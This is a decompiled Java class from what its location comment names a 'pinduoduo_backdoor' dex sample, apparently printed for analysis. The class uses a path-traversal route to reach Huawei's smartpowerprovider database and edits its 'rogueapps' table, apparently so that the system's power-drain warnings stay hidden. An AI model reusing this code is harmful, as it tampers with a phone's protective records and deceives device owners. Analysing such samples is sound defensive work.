package com.google.android.sd.biz_dynamic_dex.hw_hide_power_window;

import android.content.ContentValues;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import com.google.android.sd.biz_dynamic_dex.hw_db_handler.HwDBHandler;
import com.google.android.sd.utils.IoUtils;
import java.io.File;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

public class HideUtil {
  private static final String DB_PATH_FORMAT = "/data/data/%s/../../user_de/0/%s/databases";
  
  private static final String DB_SUFFIX = "smartpowerprovider.db";
  
  public static final String INTELLIGENT_FILE_PREFIX = "/data/data/com.huawei.intelligent/files/dqtmp";
  
  public static final String TABLE_NAME = "rogueapps";
  
  private static final AtomicBoolean inProcess = new AtomicBoolean(false);
  
  public static void deleteCache() {
    IoUtils.deleteRecycle(new File("/data/data/com.huawei.intelligent/files/dqtmpsmartpowerprovider.db"));
    IoUtils.deleteRecycle(new File("/data/data/com.huawei.intelligent/files/dqtmptmp"));
  }
  
  public static HwDBHandler generateDBHandler(Context paramContext) {
    return new HwDBHandler(paramContext, getFilePath(paramContext), "/data/data/com.huawei.intelligent/files/dqtmp", "smartpowerprovider.db");
  }
  
  private static String getFilePath(Context paramContext) {
    String str = ManagerPkgGetOnHw.getManagerPkgName(paramContext);
    return String.format("/data/data/%s/../../user_de/0/%s/databases", new Object[] { str, str });
  }
  
  static boolean insertNewRecord(SQLiteDatabase paramSQLiteDatabase, ContentValues paramContentValues, String paramString) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #10
    //   3: aconst_null
    //   4: astore #9
    //   6: iconst_0
    //   7: istore_3
    //   8: aload_0
    //   9: ldc 'rogueapps'
    //   11: aconst_null
    //   12: ldc 'pkgname = ?'
    //   14: iconst_1
    //   15: anewarray java/lang/String
    //   18: dup
    //   19: iconst_0
    //   20: aload_2
    //   21: aastore
    //   22: aconst_null
    //   23: aconst_null
    //   24: aconst_null
    //   25: invokevirtual query : (Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   28: astore #8
    //   30: aload #8
    //   32: ifnull -> 68
    //   35: aload #8
    //   37: invokeinterface getCount : ()I
    //   42: ifle -> 68
    //   45: aload_0
    //   46: ldc 'rogueapps'
    //   48: aload_1
    //   49: ldc 'pkgname = ?'
    //   51: iconst_1
    //   52: anewarray java/lang/String
    //   55: dup
    //   56: iconst_0
    //   57: aload_2
    //   58: aastore
    //   59: invokevirtual update : (Ljava/lang/String;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    //   62: i2l
    //   63: lstore #4
    //   65: goto -> 78
    //   68: aload_0
    //   69: ldc 'rogueapps'
    //   71: aconst_null
    //   72: aload_1
    //   73: invokevirtual insert : (Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J
    //   76: lstore #4
    //   78: lload #4
    //   80: lstore #6
    //   82: aload #8
    //   84: ifnull -> 130
    //   87: aload #8
    //   89: invokeinterface close : ()V
    //   94: lload #4
    //   96: lstore #6
    //   98: goto -> 130
    //   101: astore_1
    //   102: aload #9
    //   104: astore_0
    //   105: aload_0
    //   106: ifnull -> 115
    //   109: aload_0
    //   110: invokeinterface close : ()V
    //   115: aload_1
    //   116: athrow
    //   117: aload_0
    //   118: ifnull -> 127
    //   121: aload_0
    //   122: invokeinterface close : ()V
    //   127: lconst_0
    //   128: lstore #6
    //   130: lload #6
    //   132: lconst_0
    //   133: lcmp
    //   134: ifle -> 139
    //   137: iconst_1
    //   138: istore_3
    //   139: iload_3
    //   140: ireturn
    //   141: astore_0
    //   142: aload #10
    //   144: astore_0
    //   145: goto -> 117
    //   148: astore_0
    //   149: goto -> 159
    //   152: astore_1
    //   153: aload #8
    //   155: astore_0
    //   156: goto -> 105
    //   159: aload #8
    //   161: astore_0
    //   162: goto -> 117
    // Exception table:
    //   from	to	target	type
    //   8	30	141	java/lang/Exception
    //   8	30	101	finally
    //   35	65	148	java/lang/Exception
    //   35	65	152	finally
    //   68	78	148	java/lang/Exception
    //   68	78	152	finally
  }
  
  static Map<String, Long> queryFromDb(SQLiteDatabase paramSQLiteDatabase, String paramString) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #36
    //   3: aconst_null
    //   4: astore #35
    //   6: aload_0
    //   7: ldc 'rogueapps'
    //   9: aconst_null
    //   10: ldc 'pkgname = ?'
    //   12: iconst_1
    //   13: anewarray java/lang/String
    //   16: dup
    //   17: iconst_0
    //   18: aload_1
    //   19: aastore
    //   20: aconst_null
    //   21: aconst_null
    //   22: aconst_null
    //   23: invokevirtual query : (Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   26: astore_0
    //   27: aload_0
    //   28: ifnull -> 423
    //   31: aload_0
    //   32: invokeinterface getCount : ()I
    //   37: ifgt -> 43
    //   40: goto -> 423
    //   43: aload_0
    //   44: invokeinterface moveToFirst : ()Z
    //   49: pop
    //   50: aload_0
    //   51: invokeinterface isAfterLast : ()Z
    //   56: ifne -> 302
    //   59: aload_0
    //   60: aload_0
    //   61: ldc 'isrogue'
    //   63: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   68: invokeinterface getInt : (I)I
    //   73: istore_2
    //   74: iload_2
    //   75: i2l
    //   76: lstore_3
    //   77: aload_0
    //   78: aload_0
    //   79: ldc 'ignore'
    //   81: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   86: invokeinterface getInt : (I)I
    //   91: istore_2
    //   92: iload_2
    //   93: i2l
    //   94: lstore #7
    //   96: aload_0
    //   97: aload_0
    //   98: ldc 'clear'
    //   100: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   105: invokeinterface getInt : (I)I
    //   110: istore_2
    //   111: iload_2
    //   112: i2l
    //   113: lstore #5
    //   115: aload_0
    //   116: aload_0
    //   117: ldc 'presetblackapp'
    //   119: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   124: invokeinterface getInt : (I)I
    //   129: istore_2
    //   130: iload_2
    //   131: i2l
    //   132: lstore #9
    //   134: aload_0
    //   135: aload_0
    //   136: ldc 'highwakefreq'
    //   138: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   143: invokeinterface getInt : (I)I
    //   148: istore_2
    //   149: iload_2
    //   150: i2l
    //   151: lstore #11
    //   153: aload_0
    //   154: aload_0
    //   155: ldc 'ignorewakeup'
    //   157: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   162: invokeinterface getInt : (I)I
    //   167: istore_2
    //   168: iload_2
    //   169: i2l
    //   170: lstore #13
    //   172: aload_0
    //   173: aload_0
    //   174: ldc 'time'
    //   176: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   181: invokeinterface getLong : (I)J
    //   186: lstore #17
    //   188: aload_0
    //   189: aload_0
    //   190: ldc 'roguetype'
    //   192: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   197: invokeinterface getInt : (I)I
    //   202: istore_2
    //   203: lload #13
    //   205: lstore #19
    //   207: iload_2
    //   208: i2l
    //   209: lstore #15
    //   211: lload_3
    //   212: lstore #13
    //   214: lload #15
    //   216: lstore_3
    //   217: lload #17
    //   219: lstore #15
    //   221: lload #19
    //   223: lstore #17
    //   225: goto -> 341
    //   228: lload #13
    //   230: lstore #19
    //   232: lload_3
    //   233: lstore #15
    //   235: lload #7
    //   237: lstore #13
    //   239: lload #17
    //   241: lstore_3
    //   242: lload #19
    //   244: lstore #7
    //   246: goto -> 491
    //   249: lload #13
    //   251: lstore #17
    //   253: ldc2_w -1
    //   256: lstore #19
    //   258: lload_3
    //   259: lstore #15
    //   261: lload #7
    //   263: lstore #13
    //   265: lload #19
    //   267: lstore_3
    //   268: lload #17
    //   270: lstore #7
    //   272: goto -> 491
    //   275: lload_3
    //   276: lstore #15
    //   278: lload #7
    //   280: lstore #13
    //   282: goto -> 482
    //   285: goto -> 470
    //   288: goto -> 465
    //   291: ldc2_w -1
    //   294: lstore #5
    //   296: goto -> 465
    //   299: goto -> 455
    //   302: ldc2_w -1
    //   305: lstore_3
    //   306: ldc2_w -1
    //   309: lstore #5
    //   311: ldc2_w -1
    //   314: lstore #7
    //   316: ldc2_w -1
    //   319: lstore #13
    //   321: ldc2_w -1
    //   324: lstore #9
    //   326: ldc2_w -1
    //   329: lstore #11
    //   331: ldc2_w -1
    //   334: lstore #15
    //   336: ldc2_w -1
    //   339: lstore #17
    //   341: lload_3
    //   342: lstore #33
    //   344: lload #5
    //   346: lstore #31
    //   348: lload #7
    //   350: lstore #29
    //   352: lload #13
    //   354: lstore #27
    //   356: lload #9
    //   358: lstore #25
    //   360: lload #11
    //   362: lstore #23
    //   364: lload #15
    //   366: lstore #21
    //   368: lload #17
    //   370: lstore #19
    //   372: aload_0
    //   373: ifnull -> 533
    //   376: aload_0
    //   377: invokeinterface close : ()V
    //   382: lload_3
    //   383: lstore #33
    //   385: lload #5
    //   387: lstore #31
    //   389: lload #7
    //   391: lstore #29
    //   393: lload #13
    //   395: lstore #27
    //   397: lload #9
    //   399: lstore #25
    //   401: lload #11
    //   403: lstore #23
    //   405: lload #15
    //   407: lstore #21
    //   409: lload #17
    //   411: lstore #19
    //   413: goto -> 533
    //   416: astore_1
    //   417: goto -> 439
    //   420: goto -> 451
    //   423: aload_0
    //   424: ifnull -> 433
    //   427: aload_0
    //   428: invokeinterface close : ()V
    //   433: aconst_null
    //   434: areturn
    //   435: astore_1
    //   436: aload #35
    //   438: astore_0
    //   439: aload_0
    //   440: ifnull -> 449
    //   443: aload_0
    //   444: invokeinterface close : ()V
    //   449: aload_1
    //   450: athrow
    //   451: ldc2_w -1
    //   454: lstore_3
    //   455: ldc2_w -1
    //   458: lstore #5
    //   460: ldc2_w -1
    //   463: lstore #7
    //   465: ldc2_w -1
    //   468: lstore #9
    //   470: ldc2_w -1
    //   473: lstore #11
    //   475: lload #7
    //   477: lstore #13
    //   479: lload_3
    //   480: lstore #15
    //   482: ldc2_w -1
    //   485: lstore_3
    //   486: ldc2_w -1
    //   489: lstore #7
    //   491: aload_0
    //   492: ifnull -> 501
    //   495: aload_0
    //   496: invokeinterface close : ()V
    //   501: ldc2_w -1
    //   504: lstore #33
    //   506: lload #7
    //   508: lstore #19
    //   510: lload_3
    //   511: lstore #21
    //   513: lload #11
    //   515: lstore #23
    //   517: lload #9
    //   519: lstore #25
    //   521: lload #15
    //   523: lstore #27
    //   525: lload #13
    //   527: lstore #29
    //   529: lload #5
    //   531: lstore #31
    //   533: new java/util/HashMap
    //   536: dup
    //   537: invokespecial <init> : ()V
    //   540: astore_0
    //   541: aload_0
    //   542: ldc 'isrogue'
    //   544: lload #27
    //   546: invokestatic valueOf : (J)Ljava/lang/Long;
    //   549: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   554: pop
    //   555: aload_0
    //   556: ldc 'ignore'
    //   558: lload #29
    //   560: invokestatic valueOf : (J)Ljava/lang/Long;
    //   563: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   568: pop
    //   569: aload_0
    //   570: ldc 'clear'
    //   572: lload #31
    //   574: invokestatic valueOf : (J)Ljava/lang/Long;
    //   577: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   582: pop
    //   583: aload_0
    //   584: ldc 'presetblackapp'
    //   586: lload #25
    //   588: invokestatic valueOf : (J)Ljava/lang/Long;
    //   591: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   596: pop
    //   597: aload_0
    //   598: ldc 'highwakefreq'
    //   600: lload #23
    //   602: invokestatic valueOf : (J)Ljava/lang/Long;
    //   605: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   610: pop
    //   611: aload_0
    //   612: ldc 'ignorewakeup'
    //   614: lload #19
    //   616: invokestatic valueOf : (J)Ljava/lang/Long;
    //   619: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   624: pop
    //   625: aload_0
    //   626: ldc 'time'
    //   628: lload #21
    //   630: invokestatic valueOf : (J)Ljava/lang/Long;
    //   633: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   638: pop
    //   639: aload_0
    //   640: ldc 'roguetype'
    //   642: lload #33
    //   644: invokestatic valueOf : (J)Ljava/lang/Long;
    //   647: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   652: pop
    //   653: aload_0
    //   654: areturn
    //   655: astore_0
    //   656: aload #36
    //   658: astore_0
    //   659: goto -> 451
    //   662: astore_1
    //   663: goto -> 420
    //   666: astore_1
    //   667: goto -> 299
    //   670: astore_1
    //   671: goto -> 291
    //   674: astore_1
    //   675: goto -> 288
    //   678: astore_1
    //   679: goto -> 285
    //   682: astore_1
    //   683: goto -> 275
    //   686: astore_1
    //   687: goto -> 249
    //   690: astore_1
    //   691: goto -> 228
    // Exception table:
    //   from	to	target	type
    //   6	27	655	java/lang/Exception
    //   6	27	435	finally
    //   31	40	662	java/lang/Exception
    //   31	40	416	finally
    //   43	74	662	java/lang/Exception
    //   43	74	416	finally
    //   77	92	666	java/lang/Exception
    //   77	92	416	finally
    //   96	111	670	java/lang/Exception
    //   96	111	416	finally
    //   115	130	674	java/lang/Exception
    //   115	130	416	finally
    //   134	149	678	java/lang/Exception
    //   134	149	416	finally
    //   153	168	682	java/lang/Exception
    //   153	168	416	finally
    //   172	188	686	java/lang/Exception
    //   172	188	416	finally
    //   188	203	690	java/lang/Exception
    //   188	203	416	finally
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\7c6e6702-e461-4315-8631-eee246aeba95-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\hw_hide_power_window\HideUtil.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */